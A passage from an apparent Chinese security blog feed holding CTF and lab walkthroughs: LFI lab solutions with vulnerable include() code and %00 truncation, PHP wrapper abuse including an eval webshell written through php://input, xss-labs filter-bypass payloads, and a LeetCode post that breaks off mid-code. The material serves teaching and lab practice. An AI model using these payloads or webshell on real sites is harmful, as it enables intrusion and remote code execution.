name=<span class="string">&quot;page&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_POST</span>[<span class="string">&quot;page&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用Post传参即可</p><h1 id="LFI-7"><a href="#LFI-7" class="headerlink" title="LFI-7"></a>LFI-7</h1><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>     <span class="keyword">include</span>(<span class="string">&quot;../common/header.php&quot;</span>);   <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!-- <span class="keyword">from</span> http:<span class="comment">//www.ush.it/2009/02/08/php-filesystem-attack-vectors/ --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> hint(<span class="string">&quot;will include the arg specified in the POST parameter \&quot;library\&quot;, appends .php to end, use null byte %00 to bypass&quot;</span>); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;/LFI-7/index.php&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;library&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;includes/&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;library&#x27;</span>].<span class="string">&quot;.php&quot;</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用POST传参然后使用%00进行截断就可以</p><h1 id="LFI-8—LFI-10"><a href="#LFI-8—LFI-10" class="headerlink" title="LFI-8—LFI-10"></a>LFI-8—LFI-10</h1><p>原理很简单，只是使用POST传参即可</p><h1 id="LFI-11"><a href="#LFI-11" class="headerlink" title="LFI-11"></a>LFI-11</h1><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- <span class="keyword">from</span> http:<span class="comment">//hakipedia.com/index.php/Local_File_Inclusion --&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span>     <span class="keyword">include</span>(<span class="string">&quot;../common/header.php&quot;</span>);   <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> hint(<span class="string">&quot;not everything you need to play with is in a text field&quot;</span>); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;/LFI-11/index.php&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;style&quot;</span> name=<span class="string">&quot;stylepath&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;stylepath&#x27;</span>]); <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用POST传参，向参数stylepath进行传参即可</p><h1 id="LFI-13和LFI-14跟LFI-5和LFI-10一样"><a href="#LFI-13和LFI-14跟LFI-5和LFI-10一样" class="headerlink" title="LFI-13和LFI-14跟LFI-5和LFI-10一样"></a>LFI-13和LFI-14跟LFI-5和LFI-10一样</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP伪协议详解</title>
      <link href="/2022/04/30/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3/"/>
      <url>/2022/04/30/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP伪协议详解："><a href="#PHP伪协议详解：" class="headerlink" title="PHP伪协议详解："></a>PHP伪协议详解：</h1><h2 id="PHP支持的伪协议："><a href="#PHP支持的伪协议：" class="headerlink" title="PHP支持的伪协议："></a>PHP支持的伪协议：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> file:<span class="comment">// — 访问本地文件系统</span></span><br><span class="line"><span class="number">2</span> http:<span class="comment">// — 访问 HTTP(s) 网址</span></span><br><span class="line"><span class="number">3</span> ftp:<span class="comment">// — 访问 FTP(s) URLs</span></span><br><span class="line"><span class="number">4</span> php:<span class="comment">// — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line"><span class="number">5</span> zlib:<span class="comment">// — 压缩流</span></span><br><span class="line"><span class="number">6</span> data:<span class="comment">// — 数据（RFC 2397）</span></span><br><span class="line"><span class="number">7</span> glob:<span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line"><span class="number">8</span> phar:<span class="comment">// — PHP 归档</span></span><br><span class="line"><span class="number">9</span> ssh2:<span class="comment">// — Secure Shell 2</span></span><br><span class="line"><span class="number">10</span> rar:<span class="comment">// — RAR</span></span><br><span class="line"><span class="number">11</span> ogg:<span class="comment">// — 音频流</span></span><br><span class="line"><span class="number">12</span> expect:<span class="comment">// — 处理交互式的流</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="1-php-filter-php-filte"><a href="#1-php-filter-php-filte" class="headerlink" title="1 php://filter php://filte"></a>1 php://filter<a href="php://filte"> php://filte</a></h2><p>php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</p><p><strong>php://filter</strong>可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取.</p><p>协议参数：</p><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>resource=&lt;要过滤的数据流&gt;</td><td>这个参数是必须的。它指定了你要筛选过滤的数据流</td></tr><tr><td>read=&lt;读链的筛选列表&gt;</td><td>该参数可选。可以设定一个或多个过滤器名称，以管道符（`</td></tr><tr><td>write=&lt;写链的筛选列表&gt;</td><td>该参数可选。可以设定一个或多个过滤器名称，以管道符（`</td></tr><tr><td>&lt;；两个链的筛选列表&gt;</td><td>任何没有以 <code>read=</code> 或 <code>write=</code> 作前缀 的筛选器列表会视情况应用于读或写链。</td></tr></tbody></table><p>常用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=index.php</span><br><span class="line">php://filter/resource=index.php</span><br></pre></td></tr></table></figure><p>利用filter协议读文件±，将index.php通过base64编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码。</p><p>而使用的convert.base64-encode，就是一种过滤器。</p><p>可以使用base64decode来绕过死亡exit。</p><h2 id="什么是死亡exit"><a href="#什么是死亡exit" class="headerlink" title="什么是死亡exit"></a>什么是死亡exit</h2><p>exit ()函数是PHP中的一个内置函数，用于输出消息并终止当前脚本。 exit ()函数仅终止脚本的执行。 语法为exit (message)，将要显示的消息作为参数传递给exit ()函数，它终止脚本并显示消息。</p><p>死亡exit指的是在进行写入PHP文件操作时，执行了以下函数：</p><p><code> file_put_contents($content, &#39;&lt;?php exit();&#39; . $content);</code></p><p>亦或者</p><p><code> file_put_contents($content, &#39;&lt;?php exit();?&gt;&#39; . $content);</code></p><p>这样，当你插入一句话木马时，文件的内容是这样子的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php exit();?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[&#x27;snakin&#x27;]);?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样即使插入了一句话木马，在被使用的时候也无法被执行。这样的死亡exit通常存在于缓存、配置文件等等不允许用户直接访问的文件当中。</p><h2 id="base64decode绕过"><a href="#base64decode绕过" class="headerlink" title="base64decode绕过"></a>base64decode绕过</h2><p>利用filter协议来绕过，看下这样的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$content = &#x27;&lt;?php exit; ?&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">$content .= $_POST[&#x27;txt&#x27;];</span><br><span class="line"></span><br><span class="line">file_put_contents($_POST[&#x27;filename&#x27;], $content);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当用户通过POST方式提交一个数据时，会与死亡exit进行拼接，从而避免提交的数据被执行。</p><p>然而这里可以利用php://filter的base64-decode方法，将$content解码，利用php base64_decode函数特性去除死亡exit。</p><p>base64编码中只包含64个可打印字符，当PHP遇到不可解码的字符时，会选择性的跳过，这个时候base64就相当于以下的过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$_GET[&#x27;txt&#x27;] = preg_replace(&#x27;|[^a-z0-9A-Z+/]|s&#x27;, &#x27;&#x27;, $_GET[&#x27;txt&#x27;]);</span><br><span class="line"></span><br><span class="line">base64_decode($_GET[&#x27;txt&#x27;]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>所以，当$content 包含 <?php exit; ?>时，解码过程会先去除识别不了的字符，&lt; ; ? &gt;和空格等都将被去除，于是剩下的字符就只有phpexit以及我们传入的字符了。由于base64是4个byte一组，再添加一个字符例如添加字符’a’后，将’phpexita’当做两组base64进行解码，也就绕过这个死亡exit了。</p><p>这个时候后面再加上编码后的一句话木马，就可以getshell了。</p><h2 id="2-data"><a href="#2-data" class="headerlink" title="2 data://"></a>2 data://</h2><p>数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。</p><p>示例用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、data://text/plain,</span><br><span class="line">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br><span class="line"> </span><br><span class="line">2、data://text/plain;base64,</span><br><span class="line">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="范例"><a href="#范例" class="headerlink" title="范例"></a>范例</h3><p>Example #1 打印 data:// 的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 打印 &quot;I love PHP&quot;</span><br><span class="line">echo  file_get_contents ( &#x27;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#x27; );</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>Example #2 获取媒体类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$fp    =  fopen ( &#x27;data://text/plain;base64,&#x27; ,  &#x27;r&#x27; );</span><br><span class="line">$meta  =  stream_get_meta_data ( $fp );</span><br><span class="line"></span><br><span class="line">// 打印 &quot;text/plain&quot;</span><br><span class="line">echo  $meta [ &#x27;mediatype&#x27; ];</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="3-file"><a href="#3-file" class="headerlink" title="3 file://"></a>3 file://</h2><p>用于访问本地文件系统，并且不受allow_url_fopen，allow_url_include影响<br>file://协议主要用于访问文件(绝对路径、相对路径以及网络路径)<br>比如：<code>http://www.xx.com?file=file:///etc/passsword</code></p><h2 id="4-php"><a href="#4-php" class="headerlink" title="4 php://"></a>4 php://</h2><p>在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用<br> php://作用为访问输入输出流</p><h2 id="5-php-input"><a href="#5-php-input" class="headerlink" title="5 php://input"></a>5 php://input</h2><p>php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</p><p>例如：<br><code>http://127.0.0.1/cmd.php?cmd=php://input</code><br>POST数据：<?php phpinfo()?></p><p>若有写入权限，还可以写入一句话木马</p><p>[POST DATA部分]</p><p><code> &lt;?php fputs(fopen(&#39;1juhua.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_GET[cmd]); ?&gt;&#39;); ?&gt;</code></p><p>注意：<br>当enctype=”multipart/form-data”的时候 php://input` 是无效的</p><p>遇到file_get_contents()要想到用php://input绕过。</p><h2 id="6-zip"><a href="#6-zip" class="headerlink" title="6 zip://"></a>6 zip://</h2><p>zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">zip://中只能传入绝对路径。</span><br><span class="line">要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23（即下述POC中#要用%23替换）</span><br><span class="line">只需要是zip的压缩包即可，后缀名可以任意更改。</span><br><span class="line">相同的类型的还有zlib://和bzip2://</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>xss-labs通关教程</title>
      <link href="/2022/04/23/xss-labs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/"/>
      <url>/2022/04/23/xss-labs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h1><img src="/2022/04/23/xss-labs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/1.png" class=""><p>首先观察一下页面，我们可以知道：采用get类型传参，并且得到的参数会回显到页面之上，而且会计算它的长度。</p><img src="/2022/04/23/xss-labs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/2.png" class=""><p>通过观察源码我们可以发现标红的位置存在注入点。注入类型为XSS反射型注入。</p><p>将name的参数改变为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>直接通关！！</p><h1 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h1><img src="/2022/04/23/xss-labs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/3.png" class=""><p>将test改为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>发现它并没有进行弹窗，这时候我们查看源码</p><img src="/2022/04/23/xss-labs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/4.png" class=""><p>发现它将&lt;&gt;都变成了HTML的实体字符了，猜测是使用htmlspecialchars()函数。</p><p>但是我们发现仍有地方没有被更改</p><img src="/2022/04/23/xss-labs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/5.png" class=""><p>但是它的语句在属性的值里，原来的语句是无法进行弹窗的这是我们更改语句使语句闭合。</p><p><code> &quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;//</code></p><p>成功通关</p><h1 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h1><p>插入注入语句之后发现并没有出现弹窗，查看源码。</p><img src="/2022/04/23/xss-labs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/6.png" class=""><p>发现两处都被转义成为了HTML实体的字符了。猜测后端有两个htmlspecialchars()函数，通过查看后端的代码证实了我们的猜想。</p><p>我们可以通过<code>&lt;input&gt;</code>标签的一些特殊事件来执行JS代码。</p><p>构造代码：<code>level3.php?keyword=&#39;onfocus=javascript:alert(&#39;xss&#39;) &gt; //&amp;submit=搜索</code></p><p>或者是<code>&#39; onclick=&#39;alert(1)</code></p><p>onfocus 事件是在对象获得焦点时才产生，onfocus 通常用于 <code>&lt;input&gt;, &lt;select&gt;</code>, 和<code>&lt;a&gt;</code>.</p><p>简单的说就是要鼠标点击输入框的时候才会触发。</p><p>成功通关</p><h1 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h1><p>插入注入语句并没有出现弹窗，查看页面的源代码</p><img src="/2022/04/23/xss-labs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/7.png" class=""><p>我们可以发现1处被转译成的HTML实体的字符，2处直接除去&lt;&gt;，这时我们考虑采用</p><p> <code>test&quot; onclick=&quot;alert(1) </code></p><p>采用事件触发的方式不需要用到&lt;&gt;,通关后端我们可以知道后端采用str_replace() 函数将&lt;&gt;消去了。</p><p>成功通关</p><h1 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h1><p>插入注入语句并没有出现弹窗，查看页面的源代码</p><img src="/2022/04/23/xss-labs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/8.png" class=""><p>可以发现后端将script转换为scr_ipt并且转义为HTML实体的字符。</p><p>然后发现on也被过滤了，而且所有的事件属性都是带有on的，所以在此处无法采用事件</p><p>构造一个Payload闭合闭合原标签，重新创建一个a标签</p><p>a标签中引入一个script超链接来调用弹窗</p><p>这时我们考虑采用</p><p> <code>&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;link&lt;/a&gt; </code></p><p>成功绕过，通过后端代码我们可以知道后端将script转义为scr_ipt,将on转义为o_n,转义为HTML实体的字符。</p><p>成功通关</p><h1 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h1><p>插入注入语句并没有出现弹窗，查看页面的源代码</p><img src="/2022/04/23/xss-labs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/9.png" class=""><p>使用注入语句<code>&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;link&lt;/a&gt;</code>发现并没有弹窗，查看页面的源代码发现href被转义成了hr_ef</p><img src="/2022/04/23/xss-labs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/10.png" class=""><p>此时我们查看后端的代码可以发现它转义了很多东西，但是我们发现它并没有强制变为小写，所以我们采用大写的方式绕过。</p><p>构造语句<code> &quot;&gt;&lt;a Href=&quot;javascript:alert(1)&quot;&gt;link&lt;/a&gt;</code></p><p>成功绕过！</p><h1 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h1><p>插入注入语句并没有出现弹窗，查看页面的源代码</p><img src="/2022/04/23/xss-labs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/11.png" class=""><p>发现script被删，改用<code> &quot;&gt;&lt;a Href=&quot;javascript:alert(1)&quot;&gt;link&lt;/a&gt;</code></p><p>发现Href,script被删，猜测后端进行了小写转换，并且删去了href,script。</p><p>双写href和script，构造语句<code> &quot;&gt;&lt;a hrhrefef=&quot;javascscriptript:alert(1)&quot;&gt;link&lt;/a&gt;</code></p><p>这一题其实也可以采用编码绕过。</p><p>成功绕过</p><h1 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h1><p>插入注入语句没有出现弹窗，查看页面的源代码</p><img src="/2022/04/23/xss-labs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/12.png" class=""><p>发现它将‘ ’，script转义。而且因为我们只需要一个连接，所以我们采取编码的方式绕过。</p><p>采用<code>javascript:alert(1)</code>的编码：<code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</code></p><p>成功绕过。</p><h1 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h1><p>插入注入语句没有出现弹窗，查看页面的源代码.</p><img src="/2022/04/23/xss-labs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/13.png" class=""><p>发现它转义成了HTML字符，而且它它还输出了链接不合法的通知，我们查看后端的代码。发现它会寻找是否有http://的字符。</p><img src="/2022/04/23/xss-labs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/14.png" class=""><p>于是我们在编码之后加上字符串”http://“，构造语句<code> &amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;//http://</code></p><p>成功绕过</p><h1 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界web</title>
      <link href="/2022/04/23/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/"/>
      <url>/2022/04/23/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/</url>
      
        <content type="html"><![CDATA[<h1 id="第一题：baby-web"><a href="#第一题：baby-web" class="headerlink" title="第一题：baby web"></a>第一题：baby web</h1><p>题目描述说想想初始的页面是什么，将URL的1.php改为index.php发现打开之后仍然是1.php。打开检查看网络的返回包，发现有向index.php发送的包，检查响应头之后发现flag。</p><img src="/2022/04/23/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/1.png" class=""><h1 id="第二题：ics-06"><a href="#第二题：ics-06" class="headerlink" title="第二题：ics-06"></a>第二题：ics-06</h1><p>在报表中心中发现采用get传参的方式，使用burp进行整数暴力破解，选择位置为id参数的值，有效载荷选择整数类型。</p><img src="/2022/04/23/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/2.png" class=""><p>发现在2333处的数据长度异常，检查响应头之后发现flag.</p><h1 id="第三题：Training-WWW-Robots"><a href="#第三题：Training-WWW-Robots" class="headerlink" title="第三题：Training-WWW-Robots"></a>第三题：Training-WWW-Robots</h1><p>看见robots联想到爬虫协议，在URL加上robots.txt之后出现提示</p><img src="/2022/04/23/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/3.png" class=""><p>访问fl0g.php页面即可得到flag。</p><h1 id="第四题：PHP2"><a href="#第四题：PHP2" class="headerlink" title="第四题：PHP2"></a>第四题：PHP2</h1><p>访问index.php的源文件index.phps。发现是一道代码审计的问题。</p><p>经过审查源代码之后可看出需要用GET方式给id参数传递一个为“admin”的值，但是会经过一次urldecode()，会将传入的值进行url解码，所以要对admin进行两次url编码。经过编码的id参数为%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65将该值传入之后得到flag</p><h1 id="第五题：unserialize3"><a href="#第五题：unserialize3" class="headerlink" title="第五题：unserialize3"></a>第五题：unserialize3</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>算法刷题</title>
      <link href="/2022/04/04/%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98/"/>
      <url>/2022/04/04/%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="力扣刷题记录："><a href="#力扣刷题记录：" class="headerlink" title="力扣刷题记录："></a>力扣刷题记录：</h1><h2 id="第一题"><a href="#第一题" class="headerlink" title="第一题:"></a>第一题:</h2><p>给定一个整数数组 <code>nums</code> 和一个整数目标值 <code>target</code>，请你在该数组中找出 <strong>和为目标值</strong> <em><code>target</code></em> 的那 <strong>两个</strong> 整数，并返回它们的数组下标。</p><p>你可以假设每种输入只会对应一个答案。但是，数组中同一个元素在答案里不能重复出现。</p><p>你可以按任意顺序返回答案。</p><h3 id="方法1：暴力枚举法："><a href="#方法1：暴力枚举法：" class="headerlink" title="方法1：暴力枚举法："></a>方法1：暴力枚举法：</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i =<span class="number">0</span> ; i &lt;n ;i ++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = i+<span class="number">1</span> ;j &lt; n ; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] + nums[j] == target)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> &#123;i,j&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">twoSum</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], target: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>,<span class="built_in">len</span>(nums)):</span><br><span class="line">                <span class="keyword">if</span> nums[i] + nums[j] == target:</span><br><span class="line">                    <span class="keyword">return</span> [i,j]</span><br><span class="line">        <span class="keyword">return</span> [ ]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="方法2："><a href="#方法2：" class="headerlink" title="方法2："></a>方法2：</h3><p>使用哈希表，虽然会多使用一点内存，但是速度很快。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">twoSum</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], target: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span></span><br><span class="line">        hashtable = <span class="built_in">dict</span>()</span><br><span class="line">        <span class="keyword">for</span> i,num <span class="keyword">in</span> <span class="built_in">enumerate</span>(nums):      </span><br><span class="line">            <span class="keyword">if</span> target - num <span class="keyword">in</span> hashtable:</span><br><span class="line">                <span class="keyword">return</span> [hashtable[target-num],i] <span class="comment"># 